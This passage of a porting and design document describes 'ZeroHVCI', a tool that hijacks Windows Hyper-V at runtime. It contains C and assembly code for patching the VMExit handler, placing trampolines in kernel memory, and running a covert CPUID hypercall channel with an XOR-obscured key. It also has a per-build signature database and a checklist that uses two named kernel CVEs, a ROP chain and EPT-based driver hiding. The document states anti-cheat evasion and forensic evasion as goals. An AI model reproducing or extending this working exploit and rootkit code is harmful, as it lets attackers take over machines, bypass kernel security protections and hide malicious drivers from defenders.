    INT32 currentRva = *(INT32*)(hvLocalCopy + patternPos + sig->CallOffset + 1);
    originalHandler = (callAddr + 5) + currentRva;
}
```

### IndirectContext Flag (Build 17763+)

**Problem**: Windows 10 1809 changed VMExit handler calling convention.

**Old** (builds < 17763):
```c
// VMExit handler receives direct pointer to guest context
void vmexit_handler(PGUEST_CONTEXT context, ...);

// Patch:
E8 XX XX XX XX   call payload_handler  (5 bytes)
```

**New** (builds >= 17763):
```c
// VMExit handler receives pointer-to-pointer (indirection)
void vmexit_handler(PGUEST_CONTEXT* ppContext, ...);

// Payload must dereference: context = *ppContext
PGUEST_CONTEXT context = *ppContext;

// Patch (extended for code relocation):
48 B8 XX XX XX XX XX XX XX XX   mov rax, payload_handler  (10 bytes)
FF D0                            call rax                  (2 bytes)
// Total: 12 bytes, but only first 8 bytes modified (HookLen=8)
```

**C Conversion**:
```c
typedef struct _RUNTIME_OMBRA_T {
    // ... other fields ...
    UINT32 WindowsBuild;
    UINT8  IndirectContext;   // TRUE for builds >= 17763
    UINT8  HookLen;           // 5 or 8 bytes
} RUNTIME_OMBRA_T;

// Populate from version database
RUNTIME_OMBRA_T ctx;
ctx.WindowsBuild = g_VersionInfo.BuildNumber;
ctx.IndirectContext = (g_VersionInfo.BuildNumber >= 17763) ? 1 : 0;
ctx.HookLen = (ctx.IndirectContext) ? 8 : 5;

// Payload uses this to determine dereferencing
if (ombra_context.IndirectContext) {
    context = *ppContext;  // Indirect
} else {
    context = ppContext;   // Direct cast
}
```

### Trampoline Mechanism (>2GB Payloads)

**Problem**: x86-64 CALL rel32 can only jump ±2GB.

**x86-64 CALL Encoding**:
```
E8 XX XX XX XX   call rel32
   │
   └─ Signed 32-bit offset from RIP after instruction
```

**Range Calculation**:
```c
INT64 delta = payloadEntry - (callAddr + 5);
if (delta > INT32_MAX || delta < INT32_MIN) {
    // Need trampoline - payload too far
}
```

**Trampoline Code** (12 bytes):
```asm
48 B8 XX XX XX XX XX XX XX XX   mov rax, <64-bit target>
FF E0                            jmp rax
```

**Allocation Strategy 1 - Slack Space in hv.exe**:
```c
UINT64 FindSlackSpace(PUCHAR hvCopy, DWORD hvSize, UINT64 hvBase, size_t needed) {
    size_t consecutiveSlack = 0;
    size_t slackStart = 0;

    // Skip PE headers
    for (size_t i = 0x1000; i < hvSize - needed; i++) {
        // Look for int3/zero/nop padding
        BOOL isSlack = (hvCopy[i] == 0xCC ||  // int 3
                        hvCopy[i] == 0x00 ||  // zero
                        hvCopy[i] == 0x90);   // nop

        if (isSlack) {
            if (consecutiveSlack == 0) {
                slackStart = i;
            }
            consecutiveSlack++;

            // Need 12 bytes + 16 byte margin
            if (consecutiveSlack >= needed + 16) {
                // Verify all bytes are slack
                BOOL allSlack = TRUE;
                for (size_t j = 0; j < needed && allSlack; j++) {
                    UCHAR b = hvCopy[slackStart + 8 + j];
                    if (b != 0xCC && b != 0x00 && b != 0x90) {
                        allSlack = FALSE;
                    }
                }

                if (allSlack) {
                    return hvBase + slackStart + 8;
                }
            }
        } else {
            consecutiveSlack = 0;
        }
    }

    return 0;  // No slack found
}
```

**Allocation Strategy 2 - Proximity Pool Allocation**:
```c
UINT64 AllocateNearModule(UINT64 moduleBase, size_t size) {
    #define MAX_ATTEMPTS 64
    #define PROXIMITY_RANGE 0x70000000  // 1.75GB (stay under 2GB)

    UINT64 bestAddr = 0;
    INT64 bestDistance = INT64_MAX;
    UINT64 allocations[MAX_ATTEMPTS] = {0};

    for (size_t attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
        // Vary allocation size to hit different pool blocks
        size_t allocSize = size + (attempt * 0x100);

        PVOID addr = CallKernelFunction("ExAllocatePool",
            (PVOID[]){ (PVOID)NonPagedPoolNx, (PVOID)allocSize }, 2);

        if (addr) {
            UINT64 ptrVal = (UINT64)addr;
            allocations[attempt] = ptrVal;

            INT64 distance = llabs((INT64)ptrVal - (INT64)moduleBase);

            if (distance < bestDistance && distance < PROXIMITY_RANGE) {
                bestDistance = distance;
                bestAddr = ptrVal;
            }
        }
    }

    // Free all except best
    for (size_t i = 0; i < MAX_ATTEMPTS; i++) {
        if (allocations[i] != 0 && allocations[i] != bestAddr) {
            CallKernelFunction("ExFreePool", (PVOID[]){ (PVOID)allocations[i] }, 1);
        }
    }

    if (bestAddr && bestDistance < PROXIMITY_RANGE) {
        printf("[+] Best allocation: 0x%llX (distance: 0x%llX)\n",
            bestAddr, bestDistance);
        return bestAddr;
    }

    // Failed - free best one too
    if (bestAddr) {
        CallKernelFunction("ExFreePool", (PVOID[]){ (PVOID)bestAddr }, 1);
    }

    return 0;
}
```

**Trampoline Assembly & Verification**:
```c
#pragma pack(push, 1)
typedef struct _TrampolineCode {
    UINT8  MovRaxOpcode[2];  // 48 B8
    UINT64 TargetAddress;    // 8-byte absolute address
    UINT8  JmpRaxOpcode[2];  // FF E0
} TrampolineCode;
#pragma pack(pop)

void BuildTrampolineCode(TrampolineCode* tramp, UINT64 targetAddr) {
    tramp->MovRaxOpcode[0] = 0x48;
    tramp->MovRaxOpcode[1] = 0xB8;
    tramp->TargetAddress = targetAddr;
    tramp->JmpRaxOpcode[0] = 0xFF;
    tramp->JmpRaxOpcode[1] = 0xE0;
}

BOOL VerifyTrampoline(UINT64 trampolineAddr) {
    TrampolineCode readBack;
    if (!ReadKernelMemory((PVOID)trampolineAddr, &readBack, sizeof(readBack))) {
        return FALSE;
    }

    if (readBack.MovRaxOpcode[0] != 0x48 ||
        readBack.MovRaxOpcode[1] != 0xB8 ||
        readBack.JmpRaxOpcode[0] != 0xFF ||
        readBack.JmpRaxOpcode[1] != 0xE0) {
        printf("[-] Trampoline verification failed\n");
        printf("    Expected: 48 B8 ... FF E0\n");
        printf("    Got: %02X %02X ... %02X %02X\n",
            readBack.MovRaxOpcode[0], readBack.MovRaxOpcode[1],
            readBack.JmpRaxOpcode[0], readBack.JmpRaxOpcode[1]);
        return FALSE;
    }

    printf("[+] Trampoline verified: jumps to 0x%llX\n", readBack.TargetAddress);
    return TRUE;
}
```

**Full Allocation Flow**:
```c
typedef struct _TrampolineInfo {
    BOOL Success;
    UINT64 TrampolineAddr;
    UINT64 PayloadTarget;
    INT32 CallRva;
    BOOL UsesSlackSpace;
} TrampolineInfo;

TrampolineInfo AllocateTrampoline(
    UINT64 payloadEntry,
    UINT64 callRip,
    UINT64 hvBase,
    DWORD hvSize,
    PUCHAR hvLocalCopy
) {
    TrampolineInfo result = {0};
    result.PayloadTarget = payloadEntry;

    // Check if trampoline even needed
    INT64 delta = (INT64)payloadEntry - (INT64)callRip;
    if (delta <= INT32_MAX && delta >= INT32_MIN) {
        printf("[+] Payload within range - no trampoline needed\n");
        result.Success = TRUE;
        result.TrampolineAddr = payloadEntry;
        result.CallRva = (INT32)delta;
        return result;
    }

    printf("[!] Payload too far (>2GB) - allocating trampoline\n");

    // Strategy 1: Find slack space
    UINT64 slackAddr = FindSlackSpace(hvLocalCopy, hvSize, hvBase, 12);
    if (slackAddr) {
        INT32 slackRva = CalculateCallRva(callRip, slackAddr);
        if (slackRva != 0) {
            TrampolineCode tramp;
            BuildTrampolineCode(&tramp, payloadEntry);

            if (WriteKernelMemory((PVOID)slackAddr, &tramp, sizeof(tramp))) {
                result.Success = TRUE;
                result.TrampolineAddr = slackAddr;
                result.CallRva = slackRva;
                result.UsesSlackSpace = TRUE;
                return result;
            }
        }
    }

    // Strategy 2: Allocate pool nearby
    UINT64 poolAddr = AllocateNearModule(hvBase, 12 + 0x10);
    if (poolAddr) {
        INT32 poolRva = CalculateCallRva(callRip, poolAddr);
        if (poolRva != 0) {
            TrampolineCode tramp;
            BuildTrampolineCode(&tramp, payloadEntry);

            if (WriteKernelMemory((PVOID)poolAddr, &tramp, sizeof(tramp))) {
                result.Success = TRUE;
                result.TrampolineAddr = poolAddr;
                result.CallRva = poolRva;
                result.UsesSlackSpace = FALSE;
                return result;
            }
        }
    }

    printf("[-] CRITICAL: Could not allocate trampoline\n");
    result.Success = FALSE;
    return result;
}
```

### Runtime Hijacker Class Conversion to C

**C++ Original**:
```cpp
class RuntimeHijacker {
private:
    bool m_initialized = false;
    HyperVModuleInfo m_hvInfo = {};
    UINT64 m_payloadBase = 0;
    std::vector<BYTE> m_localHvCopy;
    std::vector<BYTE> m_payloadCopy;

public:
    bool Initialize();
    bool HijackHyperV(const BYTE* payloadData, size_t payloadSize);
};
```

**C Conversion**:
```c
typedef struct _HyperVModuleInfo {
    UINT64 BaseAddress;
    UINT32 SizeOfImage;
    BOOL IsIntel;
    UINT64 VmExitCallAddr;
    UINT64 OriginalHandler;
} HyperVModuleInfo;

typedef struct _RuntimeHijacker {
    BOOL initialized;
    HyperVModuleInfo hvInfo;
    UINT64 payloadBase;
    size_t payloadSize;

    // Dynamic arrays (manual memory management)
    PUCHAR localHvCopy;
    DWORD localHvSize;
    PUCHAR payloadCopy;
    DWORD payloadCopySize;

    // Trampoline state
    UINT64 trampolineAddr;
    BOOL usesTrampoline;

    // Version-specific flags
    BOOL indirectContext;
    UINT32 hookLen;
} RuntimeHijacker;

// Constructor replacement
void RuntimeHijacker_Init(RuntimeHijacker* self) {
    memset(self, 0, sizeof(RuntimeHijacker));
}

// Destructor replacement
void RuntimeHijacker_Cleanup(RuntimeHijacker* self) {
    if (self->localHvCopy) {
        LocalFree(self->localHvCopy);
        self->localHvCopy = NULL;
    }
    if (self->payloadCopy) {
        LocalFree(self->payloadCopy);
        self->payloadCopy = NULL;
    }
}

// Method conversions
BOOL RuntimeHijacker_Initialize(RuntimeHijacker* self) {
    if (self->initialized) {
        return TRUE;
    }

    // Step 0: Detect version
    if (!DetectWindowsVersion()) {
        printf("[!] Version detection failed - using defaults\n");
    }

    // Step 1: Verify Hyper-V
    UINT64 hvSharedData = 0;
    if (!ReadKernelMemory((PVOID)(KUSER_SHARED_DATA + 0x2EC),
                          &hvSharedData, sizeof(hvSharedData))) {
        return FALSE;
    }
    if (hvSharedData == 0) {
        printf("[-] Hyper-V not active\n");
        return FALSE;
    }

    // Step 2: Detect CPU vendor
    int cpuInfo[4];
    __cpuid(cpuInfo, 0);

    char vendor[13];
    *(int*)(vendor + 0) = cpuInfo[1];
    *(int*)(vendor + 4) = cpuInfo[3];
    *(int*)(vendor + 8) = cpuInfo[2];
    vendor[12] = '\0';

    if (strcmp(vendor, "GenuineIntel") == 0) {
        self->hvInfo.IsIntel = TRUE;
    } else if (strcmp(vendor, "AuthenticAMD") == 0) {
        self->hvInfo.IsIntel = FALSE;
    } else {
        printf("[-] Unknown CPU vendor: %s\n", vendor);
        return FALSE;
    }

    // Step 3: Find hv.exe module
    if (!RuntimeHijacker_FindHyperVModule(self)) {
        return FALSE;
    }

    // Step 4: Find VMExit handler
    if (!RuntimeHijacker_FindVmExitHandler(self)) {
        return FALSE;
    }

    self->initialized = TRUE;
    return TRUE;
}

BOOL RuntimeHijacker_HijackHyperV(
    RuntimeHijacker* self,
    const BYTE* payloadData,
    size_t payloadSize
) {
    if (!self->initialized) {
        return FALSE;
    }

    // Save payload copy
    self->payloadCopy = (PUCHAR)LocalAlloc(LMEM_FIXED, payloadSize);
    if (!self->payloadCopy) return FALSE;

    memcpy(self->payloadCopy, payloadData, payloadSize);
    self->payloadCopySize = (DWORD)payloadSize;

    // Step 1: Allocate kernel memory
    self->payloadBase = (UINT64)CallKernelFunction("ExAllocatePool",
        (PVOID[]){ (PVOID)NonPagedPoolNx, (PVOID)payloadSize }, 2);

    if (!self->payloadBase) {
        printf("[-] Failed to allocate payload memory\n");
        return FALSE;
    }

    self->payloadSize = payloadSize;

    // Step 2: Map payload
    if (!RuntimeHijacker_MapPayload(self, payloadData, payloadSize)) {
        return FALSE;
    }

    // Step 3: Populate ombra_context
    if (!RuntimeHijacker_PopulateContext(self)) {
        return FALSE;
    }

    // Step 4: Patch VMExit handler
    if (!RuntimeHijacker_PatchHandler(self)) {
        return FALSE;
    }

    printf("[+] Hyper-V hijack complete - hypervisor ACTIVE!\n");
    return TRUE;
}
```

## Assembly Components

### hypercall.asm - CPUID-Based Hypercall

**Purpose**: Trigger VMExit via CPUID to communicate with hijacked hypervisor.

**Calling Convention**:
```asm
; extern "C" VMX_ROOT_ERROR hypercall_asm(u64 code, PCOMMAND_DATA param1, u64 param2, u64 key);
;
; Parameters (Microsoft x64):
;   RCX = code (VMCALL_TYPE command, e.g., VMCALL_READ_VIRT)
;   RDX = param1 (pointer to COMMAND_DATA structure)
;   R8  = param2 (optional, e.g., target CR3 for cross-process ops)
;   R9  = key (session authentication key from VMCALL_SET_COMM_KEY)
;
; Return:
;   RAX = VMX_ROOT_ERROR status code
```

**Full Implementation**:
```asm
_text segment

hypercall_asm proc
    ; Save RBX (callee-saved, used by CPUID)
    push rbx

    ; Obfuscate key with magic constant
    ; Payload deobfuscates: key XOR 0xBABAB00E XOR 0xBABAB00E = original key
    mov rax, r9                 ; RAX = session key
    mov rbx, 0babab00eh         ; RBX = magic XOR mask
    xor r9, rbx                 ; R9 = obfuscated key

    ; RCX, RDX, R8 already contain correct values
    ; No need to move - Microsoft x64 calling convention aligns with VMExit handler expectations

    ; Execute CPUID to trigger VMExit
    ; EAX = CPUID leaf (we use 0x13371337 for debugging, but payload intercepts ALL CPUID)
    mov eax, 13371337h          ; Magic CPUID leaf
    cpuid                       ; ← VMExit occurs here

    ; Payload processes command and sets RAX = VMX_ROOT_ERROR before VMRESUME
    ; After VMRESUME, we return here with RAX already set

    ; Restore RBX
    pop rbx

    ret
hypercall_asm endp

_text ends
end
```

**C Wrapper**:
```c
// Prototype
extern VMX_ROOT_ERROR hypercall_asm(u64 code, PCOMMAND_DATA param1, u64 param2, u64 key);

// Usage
COMMAND_DATA cmd = {0};
cmd.read.address = targetAddr;
cmd.read.buffer = userBuffer;
cmd.read.length = size;

VMX_ROOT_ERROR result = hypercall_asm(
    VMCALL_READ_VIRT,
    &cmd,
    target_cr3,
    session_key
);

if (result == VMX_ROOT_ERROR_SUCCESS) {
    // Data read into userBuffer
}
```

**Key Obfuscation**:
```c
// Usermode obfuscates with XOR
u64 obfuscated_key = session_key ^ 0xBABAB00E;

// Payload deobfuscates (in vmexit_handler)
u64 deobfuscated_key = r9 ^ 0xBABAB00E;
if (deobfuscated_key == stored_session_key) {
    // Valid hypercall - process command
}
```

**Why CPUID Instead of VMCALL**:
- VMCALL requires CPL=0 (kernel mode)
- CPUID is legal from CPL=3 (usermode)
- Allows hypercalls from both usermode and kernel code
- Anti-cheats cannot hook CPUID (it causes VMExit, not a syscall)

## C Conversion Notes

### RAII to Manual Memory Management

**C++ RAII**:
```cpp
class DriverImage {
    std::vector<uint8_t> m_rawImage;
    std::vector<uint8_t> m_mappedImage;

public:
    ~DriverImage() {
        // Automatic cleanup
    }
};

DriverImage image;
image.LoadFromFile("driver.sys");
// Automatic cleanup on scope exit
```

**C Manual Management**:
```c
typedef struct _DriverImage {
    PUCHAR rawImage;
    DWORD rawImageSize;
    PUCHAR mappedImage;
    DWORD mappedImageSize;
} DriverImage;

void DriverImage_Init(DriverImage* self) {
    memset(self, 0, sizeof(DriverImage));
}

void DriverImage_Cleanup(DriverImage* self) {
    if (self->rawImage) {
        LocalFree(self->rawImage);
        self->rawImage = NULL;
    }
    if (self->mappedImage) {
        LocalFree(self->mappedImage);
        self->mappedImage = NULL;
    }
}

// Usage with goto error handling
DriverImage image;
DriverImage_Init(&image);

if (!DriverImage_LoadFromFile(&image, "driver.sys")) {
    goto cleanup;
}

// ... operations ...

cleanup:
    DriverImage_Cleanup(&image);
```

### std::vector to Dynamic Arrays

**C++**:
```cpp
std::vector<BYTE> buffer;
buffer.resize(size);
buffer.push_back(value);
```

**C**:
```c
typedef struct _DynamicBuffer {
    PUCHAR data;
    DWORD size;
    DWORD capacity;
} DynamicBuffer;

void DynamicBuffer_Resize(DynamicBuffer* self, DWORD newSize) {
    if (newSize > self->capacity) {
        DWORD newCapacity = newSize + (newSize / 2);  // Growth factor
        PUCHAR newData = (PUCHAR)realloc(self->data, newCapacity);
        if (!newData) return;  // Handle error

        self->data = newData;
        self->capacity = newCapacity;
    }
    self->size = newSize;
}

void DynamicBuffer_PushByte(DynamicBuffer* self, BYTE value) {
    if (self->size >= self->capacity) {
        DynamicBuffer_Resize(self, self->size + 1);
    }
    self->data[self->size++] = value;
}
```

**Fixed-Size Alternative** (better for kernel code):
```c
#define MAX_DRIVER_SIZE (2 * 1024 * 1024)  // 2MB max

UCHAR driverBuffer[MAX_DRIVER_SIZE];
DWORD driverSize = 0;

if (fileSize > MAX_DRIVER_SIZE) {
    printf("[-] Driver too large\n");
    return FALSE;
}

memcpy(driverBuffer, fileData, fileSize);
driverSize = fileSize;
```

### Error Handling Patterns

**C++ Exceptions**:
```cpp
try {
    if (!Initialize()) {
        throw std::runtime_error("Init failed");
    }
    ProcessData();
} catch (const std::exception& e) {
    printf("Error: %s\n", e.what());
    return false;
}
```

**C goto-based Cleanup**:
```c
BOOL Initialize_And_Process(void) {
    BOOL success = FALSE;
    HANDLE hFile = NULL;
    PVOID buffer = NULL;

    hFile = CreateFileA("data.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open file\n");
        goto cleanup;
    }

    buffer = LocalAlloc(LMEM_FIXED, 4096);
    if (!buffer) {
        printf("[-] Failed to allocate buffer\n");
        goto cleanup;
    }

    if (!Initialize()) {
        printf("[-] Init failed\n");
        goto cleanup;
    }

    if (!ProcessData(buffer)) {
        printf("[-] Process failed\n");
        goto cleanup;
    }

    success = TRUE;

cleanup:
    if (buffer) LocalFree(buffer);
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    return success;
}
```

### String Handling

**C++ std::string**:
```cpp
std::string moduleName = "hvix64.exe";
if (dllName == moduleName) {
    // Match
}
```

**C char arrays**:
```c
char moduleName[MAX_PATH] = "hvix64.exe";

// Case-insensitive compare (wide strings)
if (_wcsicmp(dllName, L"hvix64.exe") == 0) {
    // Match
}

// Safe string operations
char buffer[256];
strcpy_s(buffer, sizeof(buffer), "hello");
strcat_s(buffer, sizeof(buffer), " world");
```

### Function Pointer Arrays (vtables)

**C++**:
```cpp
template<typename Ret, typename... Args>
Ret CallKernelFunction(const char* name, Args... args);
```

**C**:
```c
typedef PVOID (*KernelFunctionPtr)(PVOID*, DWORD);

PVOID CallKernelFunction_0(const char* name) {
    return CallKernelFunctionViaName(name, NULL, 0, NULL);
}

PVOID CallKernelFunction_1(const char* name, PVOID arg1) {
    PVOID args[] = { arg1 };
    return CallKernelFunctionViaName(name, args, 1, NULL);
}

PVOID CallKernelFunction_2(const char* name, PVOID arg1, PVOID arg2) {
    PVOID args[] = { arg1, arg2 };
    return CallKernelFunctionViaName(name, args, 2, NULL);
}

// Macro wrapper for type safety
#define CALL_KERNEL_0(name) \
    CallKernelFunction_0(name)

#define CALL_KERNEL_1(name, a1) \
    CallKernelFunction_1(name, (PVOID)(a1))

#define CALL_KERNEL_2(name, a1, a2) \
    CallKernelFunction_2(name, (PVOID)(a1), (PVOID)(a2))
```

## Version-Specific Patterns

### Windows Build Signature Database

**Complete Intel Database**:
```c
const struct VmExitSignature g_IntelSignatures[] = {
    // Build 16299 (Win10 1709)
    { 16299, 17133, TRUE,
      { /* pattern */ }, { /* mask */ }, 25, 0x86, 5, FALSE,
      TRUE, 0x50, 0x150, 0xE8 },

    // Build 17134 (Win10 1803)
    { 17134, 17762, TRUE,
      { /* same pattern */ }, { /* mask */ }, 25, 0xD7, 5, FALSE,
      TRUE, 0x50, 0x150, 0xE8 },

    // Build 17763-18363 (Win10 1809-1909) - IndirectContext begins
    { 17763, 18363, TRUE,
      { /* same pattern */ }, { /* mask */ }, 25, 0x11E, 8, TRUE,
      TRUE, 0x80, 0x180, 0xE8 },

    // Build 19041-19045 (Win10 2004-22H2)
    { 19041, 19045, TRUE,
      { /* same pattern */ }, { /* mask */ }, 25, 0xCC, 5, TRUE,
      TRUE, 0x80, 0x150, 0xE8 },

    // Build 22000-22999 (Win11 21H2-23H2)
    { 22000, 22999, TRUE,
      { /* same pattern */ }, { /* mask */ }, 25, 0x10B, 5, TRUE,
      TRUE, 0x80, 0x150, 0xE8 },

    // Build 23000+ (Win11 24H2 and future)
    { 23000, 99999, TRUE,
      { /* same pattern */ }, { /* mask */ }, 25, 0x10B, 5, TRUE,
      TRUE, 0x80, 0x180, 0xE8 }
};
```

**AMD Universal Signature** (stable across all versions):
```c
const struct VmExitSignature g_AmdSignatures[] = {
    // Universal pattern - works on all Win10/11
    { 16299, 99999, FALSE,
      { 0xE8, 0x??, 0x??, 0x??, 0x??,  // call vcpu_run
        0x48, 0x89, 0x04, 0x24,         // mov [rsp], rax
        0xE9 },                          // jmp
      { 'x', '?', '?', '?', '?',
        'x', 'x', 'x', 'x', 'x' },
      10, 0, 5, FALSE,
      FALSE, 0, 0, 0 }
};
```

**Lookup Function**:
```c
const struct VmExitSignature* FindSignatureForBuild(UINT32 buildNumber, BOOL isIntel) {
    const struct VmExitSignature* database = isIntel ? g_IntelSignatures : g_AmdSignatures;
    size_t count = isIntel ? INTEL_SIG_COUNT : AMD_SIG_COUNT;

    for (size_t i = 0; i < count; i++) {
        if (buildNumber >= database[i].MinBuild &&
            buildNumber <= database[i].MaxBuild) {
            return &database[i];
        }
    }

    return NULL;  // Unknown version
}
```

## Testing Checklist

### Phase 1: Exploit Verification
- [ ] Leak EPROCESS/KTHREAD addresses via NtQuerySystemInformation
- [ ] CSC exploit succeeds (CVE-2024-26229)
  - [ ] Device opens successfully (`\\Device\\Mup\\;Csc\\.\\.`)
  - [ ] NtFsControlFile with IOCTL 0x001401a3 returns success
  - [ ] KTHREAD->PreviousMode becomes 0
- [ ] KS exploit fallback works (CVE-2024-35250)
  - [ ] DRM device opens via SetupAPI
  - [ ] Fake RTL_BITMAP allocated at 0x10000000
  - [ ] DeviceIoControl with IOCTL_KS_PROPERTY succeeds
- [ ] NtReadVirtualMemory accepts kernel addresses
- [ ] NtWriteVirtualMemory accepts kernel addresses

### Phase 2: KernelForge Verification
- [ ] ntoskrnl.exe loaded into usermode successfully
- [ ] Image mapped with correct section alignment
- [ ] Relocations processed (delta = kernel_base - ImageBase)
- [ ] All 5 ROP gadgets found in executable sections
  - [ ] g_RopAddr_1: _guard_retpoline_exit_indirect_rax
  - [ ] g_RopAddr_2: add rsp, 68h; ret
  - [ ] g_RopAddr_3: pop rcx; ret
  - [ ] g_RopAddr_4: mov [rcx], rax; ret
  - [ ] g_RopAddr_5: ret (dummy)
- [ ] ZwTerminateThread located
- [ ] Dummy thread created and enters Waiting state
- [ ] KTHREAD address leaked from handle table
- [ ] Stack bounds read (StackBase, KernelStack)
- [ ] Syscall return address found at stack bottom
- [ ] Test call: ExAllocatePool returns valid pool address
- [ ] Return value captured correctly
- [ ] Thread terminates with magic exit code (0x1337)

### Phase 3: Hyper-V Discovery
- [ ] KUSER_SHARED_DATA hypervisor field non-zero
- [ ] CPU vendor detected (GenuineIntel or AuthenticAMD)
- [ ] PsLoadedModuleList address obtained
- [ ] LDR_DATA_TABLE_ENTRY list walked
- [ ] hvix64.exe or hvax64.exe found
- [ ] Base address and SizeOfImage extracted
- [ ] Entire hv.exe read into usermode buffer

### Phase 4: VMExit Handler Scanning
- [ ] Windows version detected (RtlGetVersion)
- [ ] Version-specific signature retrieved from database
- [ ] Pattern matched in hv.exe
- [ ] Auto-discovery finds E8 CALL opcode (Intel only)
  - [ ] Scan range validated
  - [ ] rel32 offset read
  - [ ] Absolute target calculated
  - [ ] Target validated (within hv.exe or high kernel)
- [ ] Static fallback used if auto-discovery fails
- [ ] CALL address and original handler extracted
- [ ] IndirectContext flag set correctly (builds >= 17763)
- [ ] HookLen determined (5 or 8 bytes)

### Phase 5: Payload Mapping
- [ ] Payload PE validated (DOS/NT signatures)
- [ ] NonPagedPoolNx allocated for payload
- [ ] Allocation succeeded and within addressable range
- [ ] Headers copied to kernel
- [ ] Sections copied to virtual offsets
- [ ] Relocations processed for kernel base
  - [ ] Each IMAGE_REL_BASED_DIR64 relocation applied
  - [ ] Delta calculated correctly
- [ ] ombra_context structure located via export
- [ ] vmexit_handler export found
- [ ] VmExitHandlerRva calculated
- [ ] AMD VMCB offsets extracted (AMD only)
  - [ ] VmcbBase, VmcbLink, VmcbOff populated
- [ ] WindowsBuild, IndirectContext, HookLen written

### Phase 6: Trampoline (if needed)
- [ ] Distance check performed (payload - call_rip)
- [ ] Trampoline allocated if distance > 2GB
  - [ ] Slack space search completed
    - [ ] Consecutive 0xCC/0x00/0x90 bytes found
    - [ ] 12+ bytes available
    - [ ] Address within CALL range
  - [ ] Pool allocation attempted if slack fails
    - [ ] 64 allocations attempted
    - [ ] Best allocation within 1.75GB selected
    - [ ] Others freed
- [ ] Trampoline code built (48 B8 addr FF E0)
- [ ] Trampoline written to kernel
- [ ] Trampoline verified (read back and check opcodes)
- [ ] Target address correct in trampoline

### Phase 7: VMExit Handler Patch
- [ ] New RVA calculated (payload_entry - call_rip OR trampoline - call_rip)
- [ ] RVA fits in INT32 range
- [ ] Old RVA read for logging
- [ ] New RVA written to CALL instruction (+1 offset)
- [ ] Write succeeded
- [ ] Hypervisor immediately active (all VMExits route through payload)

### Phase 8: Post-Hijack Verification
- [ ] Hypercall communication works
  - [ ] VMCALL_GET_CR3 returns valid CR3
  - [ ] Return value is VMX_ROOT_ERROR_SUCCESS
- [ ] EPT/NPT base query succeeds (VMCALL_GET_EPT_BASE)
- [ ] Storage slot operations work
  - [ ] Test write to high slot (64+)
  - [ ] Test read returns same value
- [ ] OmbraDriver.sys mapped
  - [ ] PE parsed and sections copied
  - [ ] Relocations processed
  - [ ] Imports resolved (ntoskrnl.exe only)
  - [ ] DriverEntry called via KernelForge
  - [ ] Returns STATUS_SUCCESS
- [ ] Driver callback registered (STORAGE_SLOT[CALLBACK_ADDRESS])
- [ ] EPT hiding verified
  - [ ] Read from driver base returns non-PE data
  - [ ] Driver executes correctly
- [ ] PreviousMode restored to UserMode (1)
  - [ ] CRITICAL for Windows 11 24H2+ (prevents BSOD 0x1F9)
  - [ ] Write to KTHREAD + 0x232 = 1 succeeds

### Cleanup Verification
- [ ] KernelForge cleanup called
- [ ] g_KernelImage freed
- [ ] PreviousMode verified restored
- [ ] No BSOD on return to usermode
- [ ] System stable after exit

---

## Summary

ZeroHVCI represents the cutting edge of Windows kernel exploitation and hypervisor hijacking. The C conversion must preserve:

1. **Precise timing** - ROP chains depend on exact stack layouts
2. **Memory safety** - Manual cleanup via goto patterns
3. **Version flexibility** - Dynamic signature selection and auto-discovery
4. **Error resilience** - Graceful fallback at every stage
5. **Forensic evasion** - Legitimate pool tags, cleanup of artifacts

The architecture achieves **runtime Hyper-V hijacking** with zero disk footprint and no reboot requirement - a feat that requires intimate knowledge of Windows kernel internals, x86-64 calling conventions, PE structure, ROP techniques, and hypervisor architecture.

**Key Files for C Port**:
- `zerohvci.h/cpp` - Main API skeleton
- `exploit.h` - CVE exploitation (pure C already)
- `kforge.h` - ROP chain construction (careful with stack offsets!)
- `hyperv_hijack.h` - RuntimeHijacker conversion (biggest refactor)
- `trampoline.h` - Trampoline logic (straightforward C)
- `hypercall.asm` - Assembly unchanged (already C-compatible)
- `version_detect.h` - Database conversion (global arrays)

Total estimated effort: ~40-60 hours for full C port with testing.
